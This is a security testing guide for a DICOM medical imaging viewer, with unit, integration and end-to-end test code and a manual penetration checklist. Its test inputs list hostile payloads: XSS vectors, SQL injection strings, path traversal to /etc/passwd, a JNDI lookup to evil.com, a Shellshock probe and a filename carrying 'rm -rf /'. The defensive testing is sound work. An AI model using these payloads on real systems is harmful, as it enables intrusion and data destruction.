# Security Testing Guide

## 🎯 Overview

This guide provides comprehensive instructions for conducting security testing on the DICOM medical imaging viewer application. It covers automated testing, manual testing procedures, and security assessment methodologies.

## 🏗️ Testing Framework

### Test Categories
1. **Unit Security Tests**: Individual security function testing
2. **Integration Security Tests**: Security workflow testing
3. **End-to-End Security Tests**: Complete security scenario testing
4. **Performance Security Tests**: Security impact on performance
5. **Compliance Tests**: Regulatory compliance validation

### Testing Tools
- **Jest**: Unit and integration testing framework
- **React Testing Library**: React component testing
- **Playwright**: End-to-end testing
- **ESLint Security Plugin**: Static security analysis
- **npm audit**: Dependency vulnerability scanning
- **Custom Security Scanner**: Application-specific security checks

## 🔬 Unit Security Testing

### Input Validation Testing
**Location**: `src/tests/input-validation.test.ts`

```typescript
import { validateDicomTag, validateNumericInput, sanitizeUserInput } from '@/utils/input-validation';

describe('Input Validation Security', () => {
  describe('DICOM Tag Validation', () => {
    it('should accept valid DICOM tags', () => {
      expect(validateDicomTag('(0008,0020)')).toBe(true);
      expect(validateDicomTag('(FFFF,FFFF)')).toBe(true);
    });

    it('should reject invalid DICOM tags', () => {
      expect(validateDicomTag('invalid')).toBe(false);
      expect(validateDicomTag('(ZZZZ,0020)')).toBe(false);
      expect(validateDicomTag('<script>alert("xss")</script>')).toBe(false);
    });

    it('should handle malicious input patterns', () => {
      const maliciousInputs = [
        '../../etc/passwd',
        '${jndi:ldap://evil.com/a}',
        '<img src=x onerror=alert(1)>',
        'SELECT * FROM users',
        '() { :; }; echo vulnerable'
      ];

      maliciousInputs.forEach(input => {
        expect(validateDicomTag(input)).toBe(false);
      });
    });
  });

  describe('Numeric Input Validation', () => {
    it('should validate numeric ranges correctly', () => {
      expect(validateNumericInput('50', 0, 100)).toBe(true);
      expect(validateNumericInput('101', 0, 100)).toBe(false);
      expect(validateNumericInput('-1', 0, 100)).toBe(false);
    });

    it('should reject non-numeric inputs', () => {
      expect(validateNumericInput('abc', 0, 100)).toBe(false);
      expect(validateNumericInput('50; DROP TABLE users;', 0, 100)).toBe(false);
    });
  });
});
```

### XSS Protection Testing
**Location**: `src/tests/xss-protection.test.ts`

```typescript
import { sanitizeUserInput, sanitizeHTML, sanitizeFileName } from '@/utils/xss-protection';

describe('XSS Protection Security', () => {
  describe('User Input Sanitization', () => {
    it('should remove script tags', () => {
      const maliciousInput = '<script>alert("xss")</script>Hello';
      const sanitized = sanitizeUserInput(maliciousInput);
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).toContain('Hello');
    });

    it('should remove event handlers', () => {
      const maliciousInput = '<div onclick="alert(1)">Content</div>';
      const sanitized = sanitizeUserInput(maliciousInput);
      expect(sanitized).not.toContain('onclick');
      expect(sanitized).toContain('Content');
    });

    it('should handle complex XSS vectors', () => {
      const xssVectors = [
        '<img src="x" onerror="alert(1)">',
        '<svg onload="alert(1)">',
        'javascript:alert(1)',
        '<iframe src="javascript:alert(1)">',
        '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
        '<object data="javascript:alert(1)">',
        '<embed src="javascript:alert(1)">',
        '<form><input type="text" value="&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;">',
        '<style>@import "javascript:alert(1)";</style>',
        '<link rel="stylesheet" href="javascript:alert(1)">'
      ];

      xssVectors.forEach(vector => {
        const sanitized = sanitizeUserInput(vector);
        expect(sanitized).not.toMatch(/script|javascript|onerror|onload/i);
      });
    });
  });

  describe('Filename Sanitization', () => {
    it('should remove dangerous characters from filenames', () => {
      expect(sanitizeFileName('../../../etc/passwd')).not.toContain('../');
      expect(sanitizeFileName('file<script>alert(1)</script>.dcm')).not.toContain('<script>');
      expect(sanitizeFileName('file|rm -rf /.dcm')).not.toContain('|');
    });
  });
});
```

### Authentication Testing
**Location**: `src/tests/authentication.test.ts`

```typescript
import { useSecurityStore } from '@/store/securityStore';
import { hashPassword, verifyPassword } from '@/utils/crypto';

describe('Authentication Security', () => {
  describe('Password Security', () => {
    it('should hash passwords securely', async () => {
      const password = 'testPassword123!';
      const hash = await hashPassword(password);
      
      expect(hash).not.toBe(password);
      expect(hash.length).toBeGreaterThan(50);
      expect(await verifyPassword(password, hash)).toBe(true);
    });

    it('should reject weak passwords', async () => {
      const weakPasswords = [
        '123456',
        'password',
        'abc123',
        'qwerty',
        '12345678'
      ];

      for (const weak of weakPasswords) {
        expect(() => validatePasswordStrength(weak)).toThrow();
      }
    });
  });

  describe('Session Management', () => {
    it('should handle session timeout', () => {
      const store = useSecurityStore.getState();
      store.login({ username: 'test', password: 'test' });
      
      // Simulate session timeout
      jest.advanceTimersByTime(31 * 60 * 1000); // 31 minutes
      
      expect(store.isAuthenticated).toBe(false);
    });

    it('should prevent session fixation', () => {
      const store = useSecurityStore.getState();
      const initialSessionId = store.sessionId;
      
      store.login({ username: 'test', password: 'test' });
      
      expect(store.sessionId).not.toBe(initialSessionId);
    });
  });
});
```

### Encryption Testing
**Location**: `src/tests/encryption.test.ts`

```typescript
import { secureStore, secureRetrieve } from '@/utils/secure-storage';
import { encrypt, decrypt } from '@/utils/crypto';

describe('Encryption Security', () => {
  describe('Secure Storage', () => {
    it('should encrypt and decrypt data correctly', async () => {
      const testData = { sensitive: 'information', userId: 12345 };
      
      await secureStore('test_key', testData);
      const retrieved = await secureRetrieve('test_key');
      
      expect(retrieved).toEqual(testData);
    });

    it('should fail gracefully with corrupted data', async () => {
      // Corrupt the stored data
      localStorage.setItem('test_corrupted', 'corrupted_data');
      
      const result = await secureRetrieve('test_corrupted');
      expect(result).toBeNull();
    });

    it('should use different IVs for each encryption', async () => {
      const data = { test: 'data' };
      
      await secureStore('key1', data);
      await secureStore('key2', data);
      
      const stored1 = localStorage.getItem('key1');
      const stored2 = localStorage.getItem('key2');
      
      expect(stored1).not.toBe(stored2);
    });
  });

  describe('Cryptographic Functions', () => {
    it('should generate secure random values', () => {
      const random1 = generateSecureRandom(32);
      const random2 = generateSecureRandom(32);
      
      expect(random1).not.toBe(random2);
      expect(random1.length).toBe(64); // 32 bytes = 64 hex characters
    });

    it('should use approved encryption algorithms', () => {
      const config = getEncryptionConfig();
      expect(config.algorithm).toBe('AES-256-CBC');
      expect(config.keyLength).toBe(32);
    });
  });
});
```

## 🔗 Integration Security Testing

### Security Workflow Testing
**Location**: `src/tests/integration/security-workflows.test.ts`

```typescript
import { render, screen, fireEvent, waitFor } from '@testing-library/react';
import { SecurityLogin } from '@/components/SecurityLogin';
import { DicomViewer } from '@/components/DicomViewer';

describe('Security Integration Tests', () => {
  describe('Authentication Flow', () => {
    it('should prevent access to protected components without authentication', () => {
      render(<DicomViewer />);
      
      expect(screen.getByText(/login required/i)).toBeInTheDocument();
      expect(screen.queryByText(/dicom viewer/i)).not.toBeInTheDocument();
    });

    it('should allow access after successful authentication', async () => {
      render(<SecurityLogin />);
      
      fireEvent.change(screen.getByLabelText(/username/i), {
        target: { value: 'testuser' }
      });
      fireEvent.change(screen.getByLabelText(/password/i), {
        target: { value: 'testpassword' }
      });
      fireEvent.click(screen.getByRole('button', { name: /login/i }));
      
      await waitFor(() => {
        expect(screen.getByText(/dicom viewer/i)).toBeInTheDocument();
      });
    });

    it('should handle failed authentication gracefully', async () => {
      render(<SecurityLogin />);
      
      fireEvent.change(screen.getByLabelText(/username/i), {
        target: { value: 'invalid' }
      });
      fireEvent.change(screen.getByLabelText(/password/i), {
        target: { value: 'invalid' }
      });
      fireEvent.click(screen.getByRole('button', { name: /login/i }));
      
      await waitFor(() => {
        expect(screen.getByText(/invalid credentials/i)).toBeInTheDocument();
      });
    });
  });

  describe('Authorization Flow', () => {
    it('should enforce role-based access control', async () => {
      // Login as viewer role
      const { rerender } = render(<DicomViewer userRole="viewer" />);
      
      expect(screen.queryByText(/modify annotations/i)).not.toBeInTheDocument();
      
      // Login as annotator role
      rerender(<DicomViewer userRole="annotator" />);
      
      expect(screen.getByText(/modify annotations/i)).toBeInTheDocument();
    });
  });
});
```

### Error Handling Integration
**Location**: `src/tests/integration/error-handling.test.ts`

```typescript
describe('Error Handling Integration', () => {
  describe('React Error Boundaries', () => {
    it('should catch and handle component errors securely', () => {
      const ThrowError = () => {
        throw new Error('Test error with sensitive data: /etc/passwd');
      };

      const consoleSpy = jest.spyOn(console, 'error').mockImplementation();
      
      render(
        <SecureErrorBoundary>
          <ThrowError />
        </SecureErrorBoundary>
      );

      expect(screen.getByText(/something went wrong/i)).toBeInTheDocument();
      expect(screen.queryByText(/etc\/passwd/i)).not.toBeInTheDocument();
      
      consoleSpy.mockRestore();
    });
  });

  describe('API Error Handling', () => {
    it('should handle API errors without exposing sensitive information', async () => {
      // Mock API error with sensitive information
      jest.spyOn(global, 'fetch').mockRejectedValue(
        new Error('Database connection failed: host=internal-db.company.com')
      );

      render(<DicomLoader />);
      
      await waitFor(() => {
        const errorMessage = screen.getByText(/error/i);
        expect(errorMessage).toBeInTheDocument();
        expect(errorMessage.textContent).not.toContain('internal-db.company.com');
      });
    });
  });
});
```

## 🎭 End-to-End Security Testing

### Complete Security Scenarios
**Location**: `tests/e2e/security.spec.ts`

```typescript
import { test, expect } from '@playwright/test';

test.describe('End-to-End Security Tests', () => {
  test('should prevent XSS through URL manipulation', async ({ page }) => {
    // Attempt XSS through URL parameters
    await page.goto('/viewer?search=<script>alert("xss")</script>');
    
    // Check that script is not executed
    await expect(page.locator('script')).toHaveCount(0);
    
    // Check that input is sanitized
    const searchInput = page.locator('[data-testid="search-input"]');
    await expect(searchInput).not.toHaveValue('<script>');
  });

  test('should handle session timeout gracefully', async ({ page }) => {
    // Login
    await page.goto('/login');
    await page.fill('[data-testid="username"]', 'testuser');
    await page.fill('[data-testid="password"]', 'testpassword');
    await page.click('[data-testid="login-button"]');
    
    // Verify successful login
    await expect(page.locator('[data-testid="dashboard"]')).toBeVisible();
    
    // Simulate session timeout by manipulating browser storage
    await page.evaluate(() => {
      localStorage.clear();
      sessionStorage.clear();
    });
    
    // Attempt to access protected resource
    await page.goto('/viewer');
    
    // Should redirect to login
    await expect(page.url()).toContain('/login');
  });

  test('should validate file uploads securely', async ({ page }) => {
    await page.goto('/upload');
    
    // Try to upload an invalid file type
    const fileInput = page.locator('[data-testid="file-input"]');
    await fileInput.setInputFiles({
      name: 'malicious.exe',
      mimeType: 'application/x-executable',
      buffer: Buffer.from('malicious content')
    });
    
    // Should show error for invalid file type
    await expect(page.locator('[data-testid="error-message"]')).toContainText('Invalid file type');
  });

  test('should enforce Content Security Policy', async ({ page }) => {
    // Monitor console for CSP violations
    const cspViolations: string[] = [];
    page.on('console', msg => {
      if (msg.text().includes('Content Security Policy')) {
        cspViolations.push(msg.text());
      }
    });

    await page.goto('/viewer');
    
    // Attempt to inject inline script
    await page.evaluate(() => {
      const script = document.createElement('script');
      script.textContent = 'alert("CSP bypass attempt")';
      document.body.appendChild(script);
    });
    
    // Should generate CSP violation
    expect(cspViolations.length).toBeGreaterThan(0);
  });
});
```

## 🔍 Manual Security Testing Procedures

### Penetration Testing Checklist

#### Authentication Testing
1. **Brute Force Protection**
   - [ ] Attempt multiple failed logins
   - [ ] Verify account lockout after threshold
   - [ ] Test password reset functionality
   - [ ] Verify session timeout enforcement

2. **Session Management**
   - [ ] Test session fixation vulnerabilities
   - [ ] Verify secure session token generation
   - [ ] Test concurrent session handling
   - [ ] Verify logout functionality

#### Input Validation Testing
1. **XSS Testing**
   ```bash
   # Test various XSS payloads
   <script>alert('XSS')</script>
   <img src=x onerror=alert('XSS')>
   javascript:alert('XSS')
   <svg onload=alert('XSS')>
   ```

2. **SQL Injection Testing**
   ```sql
   -- Test SQL injection in all input fields
   '; DROP TABLE users; --
   ' OR '1'='1
   '; SELECT * FROM users; --
   ```

3. **File Upload Testing**
   - [ ] Upload files with malicious extensions
   - [ ] Upload oversized files
   - [ ] Upload files with embedded scripts
   - [ ] Test file type validation bypass

#### Authorization Testing
1. **Privilege Escalation**
   - [ ] Attempt to access admin functions as regular user
   - [ ] Test horizontal privilege escalation
   - [ ] Verify role-based access controls

2. **Direct Object Reference**
   - [ ] Attempt to access other users' data
   - [ ] Test parameter manipulation
   - [ ] Verify authorization checks

### Security Assessment Tools

#### Automated Scanning Tools
```bash
# Dependency vulnerability scanning
npm audit --audit-level=moderate

# Static code analysis
npx eslint . --config eslint.config.js

# Secret detection
npm run security-scan

# Custom security scanner
node scripts/security-scan.cjs
```

#### Manual Testing Tools
- **Browser Developer Tools**: Inspect network traffic, storage, and console
- **Burp Suite**: Web application security testing
- **OWASP ZAP**: Automated vulnerability scanning
- **Postman**: API security testing

## 📊 Security Testing Metrics

### Test Coverage Metrics
- **Security Function Coverage**: Aim for 95%+ coverage of security-critical functions
- **XSS Test Coverage**: Test all user input points
- **Authentication Test Coverage**: Test all authentication flows
- **Authorization Test Coverage**: Test all permission checks

### Performance Metrics
- **Security Overhead**: Measure performance impact of security controls
- **Response Time**: Ensure security controls don't significantly impact response times
- **Memory Usage**: Monitor memory usage of security functions

### Vulnerability Metrics
- **Critical Vulnerabilities**: 0 tolerance for critical security issues
- **High Vulnerabilities**: < 5 high severity issues
- **Medium Vulnerabilities**: < 20 medium severity issues
- **Dependency Vulnerabilities**: Track and remediate within SLA

## 🚀 Continuous Security Testing

### CI/CD Integration
```yaml
# Example GitHub Actions security testing
name: Security Tests

on: [push, pull_request]

jobs:
  security-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'
          cache: 'npm'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Run security unit tests
        run: npm run test:security
      
      - name: Run dependency audit
        run: npm audit --audit-level=high
      
      - name: Run static security analysis
        run: npm run security-lint
      
      - name: Run security integration tests
        run: npm run test:security:integration
```

### Regression Testing
- **Security Regression Suite**: Maintain tests for all previously found security issues
- **Automated Execution**: Run security tests on every commit
- **Performance Regression**: Monitor for security-related performance regressions

## 📋 Security Test Reporting

### Test Results Documentation
1. **Test Execution Summary**
   - Total tests executed
   - Pass/fail rates
   - Coverage metrics
   - Performance impact

2. **Vulnerability Report**
   - New vulnerabilities found
   - Remediation status
   - Risk assessment
   - Timeline for fixes

3. **Compliance Report**
   - HIPAA compliance test results
   - GDPR compliance verification
   - Industry standard adherence

### Stakeholder Communication
- **Development Team**: Detailed technical findings
- **Security Team**: Risk assessment and recommendations
- **Management**: High-level summary and business impact
- **Compliance Team**: Regulatory compliance status

## 🔧 Testing Environment Setup

### Local Testing Environment
```bash
# Setup local security testing environment
npm install --save-dev jest @testing-library/react @testing-library/jest-dom
npm install --save-dev playwright
npm install --save-dev eslint-plugin-security

# Create test environment configuration
export NODE_ENV=test
export VITE_TEST_MODE=true
export VITE_SECURITY_STRICT=true
```

### Staging Environment Testing
- **Mirror Production**: Staging environment should mirror production security configuration
- **Test Data**: Use anonymized test data that reflects production data patterns
- **Security Controls**: All production security controls should be active in staging

## 📞 Support and Resources

### Testing Support
- **Security Team**: security@clarity-dicom.com
- **QA Team**: qa@clarity-dicom.com
- **Development Team**: dev-team@clarity-dicom.com

### External Resources
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [DICOM Security Considerations](https://www.dicomstandard.org/news-dir/faq/security)

---

**Document Version**: 1.0  
**Last Updated**: July 2025  
**Next Review**: October 2025

> 🔒 **Remember**: Security testing is an ongoing process. Regularly update test cases based on new threats and vulnerabilities discovered in the field.